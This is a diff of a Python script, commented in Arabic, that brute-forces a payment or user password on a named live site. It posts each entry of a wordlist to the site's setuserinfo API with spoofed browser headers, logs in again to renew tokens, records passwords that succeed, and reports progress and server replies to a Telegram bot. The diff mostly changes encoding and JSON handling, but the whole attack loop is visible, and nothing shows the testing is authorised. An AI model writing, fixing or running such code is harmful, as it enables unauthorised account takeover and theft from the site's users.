@@ -5,10 +5,11 @@ import json
 headers = {
     'authority': 'btsmoa.btswork.vip',
     'accept': 'application/json, text/plain, */*',
-    'content-type': 'application/x-www-form-urlencoded',
+    'content-type': 'application/json',  # استخدام JSON بدلاً من x-www-form-urlencoded
     'origin': 'https://btswork.com',
     'referer': 'https://btswork.com/',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, مثل Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'Accept-Charset': 'UTF-8',  # تأكيد دعم UTF-8
 }
 
 # ملفات البيانات
@@ -33,14 +34,14 @@ telegram_chat_id = "1701465279"
 
 # اقرأ آخر سطر تمت تجربته
 try:
-    with open(progress_file, "r") as f:
+    with open(progress_file, "r", encoding="utf-8") as f:
         last_line = int(f.read().strip())
 except (FileNotFoundError, ValueError):
     last_line = 0  
 
 # اقرأ كلمات المرور
 try:
-    with open(password_file, "r") as f:
+    with open(password_file, "r", encoding="utf-8") as f:
         passwords = f.readlines()
 except FileNotFoundError:
     print("❌ ملف الباسوردات غير موجود.")
@@ -50,14 +51,16 @@ if last_line >= len(passwords):
     print("✅ تم تجربة جميع كلمات المرور.")
     exit()
 
+
 # دالة إرسال إشعار إلى تيليجرام
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     data = {"chat_id": telegram_chat_id, "text": message}
     try:
-        requests.post(url, data=data)
+        requests.post(url, json=data)
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")
+
 
 # دالة إعادة تسجيل الدخول
 def relogin():
@@ -65,7 +68,7 @@ def relogin():
     print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
     
     try:
-        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, data=login_data)
+        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
         if response.status_code == 200:
             result = response.json()
             if "info" in result and "token" in result["info"]:
@@ -76,6 +79,7 @@ def relogin():
     except requests.exceptions.RequestException as e:
         print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")
     return False
+
 
 # دالة تجربة كلمة المرور
 def try_password(password_index):
@@ -93,7 +97,7 @@ def try_password(password_index):
     }
 
     try:
-        response = requests.post('https://btsmoa.btswork.vip/api/user/setuserinfo', headers=headers, data=data)
+        response = requests.post('https://btsmoa.btswork.vip/api/user/setuserinfo', headers=headers, json=data)
         print(f"📡 الحالة: {response.status_code}, الرد: {response.text}")
 
         # تحويل الرد إلى JSON مع تجنب الأخطاء
@@ -112,12 +116,11 @@ def try_password(password_index):
 
         # إرسال إشعار بعد كل 100 محاولة مع الرد الأخير
         if password_index % 100 == 0:
-            last_response = response.text[:400]  # تقليل حجم الرد إذا كان كبيرًا
-            send_telegram_message(f"📊 تمت تجربة {password_index} كلمة مرور.\n\n🔹 **آخر رد:**\n```{last_response}```")
+            send_telegram_message(f"📊 تمت تجربة {password_index} كلمة مرور حتى الآن.\n📢 آخر رد من السيرفر:\n{response.text}")
 
         # إذا كان "code_dec" يساوي 1، احفظ الرد وأرسل إشعارًا
         if response_json.get("code_dec") == 1:
-            with open(responses_file, "a") as rf:
+            with open(responses_file, "a", encoding="utf-8") as rf:
                 rf.write(f"""Password: {o_payword}
 Response: {json.dumps(response_json, ensure_ascii=False)}
 
@@ -128,21 +131,19 @@ Response: {json.dumps(response_json, ensure_ascii=False)}
         # تحقق مما إذا كانت العملية ناجحة
         if "نجاح" in response.text:  
             print(f"✅ تمت العملية بنجاح باستخدام الباسورد: {o_payword}")
-            with open(success_file, "a") as sf:
+            with open(success_file, "a", encoding="utf-8") as sf:
                 sf.write(o_payword + "\n")
 
     except requests.exceptions.RequestException as e:
         print(f"⚠️ حدث خطأ أثناء إرسال الطلب: {e}")
 
     # تحديث التقدم
-    with open(progress_file, "w") as pf:
+    with open(progress_file, "w", encoding="utf-8") as pf:
         pf.write(str(password_index + 1))
+
 
 # تجربة كلمات المرور بشكل متسلسل
 for i in range(last_line, len(passwords)):
-    try_password(i)
-
-# بعد انتهاء كل الباسوردات، إرسال آخر رد تم تسجيله
-send_telegram_message(f"✅ تمت تجربة جميع كلمات المرور!\n🔹 **آخر رد:**\n```{response.text[:400]}```")
+    try_password(i)  # تجربة كلمة المرور بشكل متسلسل
 
 print("✅ تمت تجربة جميع كلمات المرور أو انتهاء العملية.")
